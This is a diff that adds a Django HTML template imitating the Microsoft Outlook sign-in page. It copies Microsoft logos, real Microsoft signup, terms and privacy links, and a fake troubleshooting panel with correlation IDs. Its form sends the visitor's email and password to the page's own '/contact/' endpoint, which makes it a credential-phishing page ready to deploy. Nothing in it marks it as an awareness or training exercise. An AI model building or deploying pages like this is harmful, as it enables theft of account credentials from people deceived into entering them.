@@ -1,0 +1,87 @@
+ {% load static %}
+ <!DOCTYPE html>
+ <html lang="en">
+ <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesion en Outlook</title>
+    <link rel="stylesheet" href="{% static 'css/login.css' %}">
+
+    <!-- favicon -->
+    <link rel="icon" type="image/png" href="{% static 'image/Microsoft_logo.svg.png' %}">
+
+    <!-- google fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Caprasimo&family=Caveat&family=Courgette&family=Mulish:ital,wght@0,200;1,300&family=Noto+Sans+Thai:wght@300;400;500&family=Raleway:wght@300;400;700&family=Ysabeau+SC:wght@300;400;500&display=swap" rel="stylesheet">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Madurai:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- boostrap -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+ </head>
+ <body>
+   <div class="container">
+      <div class="oulook-container">
+         <img src="{% static 'image/outlook.png' %}" alt="">
+      </div>
+      
+       <div class="login-container">
+
+         <form method="POST" action="/contact/" class="user-form">
+            <div class="img-microsoft-container">
+               <img src="{% static 'image/microsoft_logo_pequeño.svg' %}" alt="microsoft">
+           </div>
+           <div class="sign-in-tag">
+               <h2>Sign in</h2>
+               <p>to continue Outlook</p>
+           </div>
+
+           {% csrf_token %}
+
+           <input type="email" name="user" placeholder="Email, phone, or skype">
+           <input type="password" name="password" placeholder="Password">
+           <div class="new-entry">
+               <p>No account?</p>
+               <a href="https://signup.live.com/signup?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=9A15315866FF2A0B&opid=9088BDCBBBF5CE58&bk=1711229662&sru=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26contextid%3d9A15315866FF2A0B%26opid%3d9088BDCBBBF5CE58%26mkt%3dEN-US%26lc%3d1033%26bk%3d1711229662%26uaid%3dc5b47cc222c4484b90fdd8e9060f00f2&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=c5b47cc222c4484b90fdd8e9060f00f2">create one!</a>
+           </div>
+           <br>
+           <div class="button-container">
+               <button id="btn-user">Next</button>
+           </div>
+         </form>
+       </div>
+   </div>
+
+   <div id="modal">
+      <div class="directions">
+         <div class="direction-1">
+            <span id="direction">
+               ID de correlación: b849e8bb561844d49516c291115f819d Marca de tiempo: 2024-03-24T20:28:39.978Z
+            </span>
+            <h3>Troubleshooting details</h3>
+            <p>If you contact your administrator, send this info to them.</p>
+            <a id="copied-a" href="#">
+               Copy info to clipboard &nbsp<p id="copied-p"> <i class="bi bi-check-circle"></i>&nbsp Copied</p>
+            </a>
+         </div>
+         <div class="direction-2">
+            <p><b>Correlation Id:</b> bb3166c1703145e1b2b7a10f863744e2</p>
+            <p><b>Timestamp:</b>2024-03-24T17:54:37.866Z</p>
+         </div>
+      </div>
+   </div>
+
+
+   <footer>
+      <a href="https://www.microsoft.com/es-mx/servicesagreement/" target="_blank">
+         Terms of use
+      </a>
+      <a href="https://privacy.microsoft.com/es-mx/privacystatement" target="_blank">
+         Privacy & cookies
+      </a>
+      <button id="btn-problems"> . . . </button>
+  </footer>
+  <script src="{% static 'js/app.js' %}"></script>
+ </body>
+ </html>
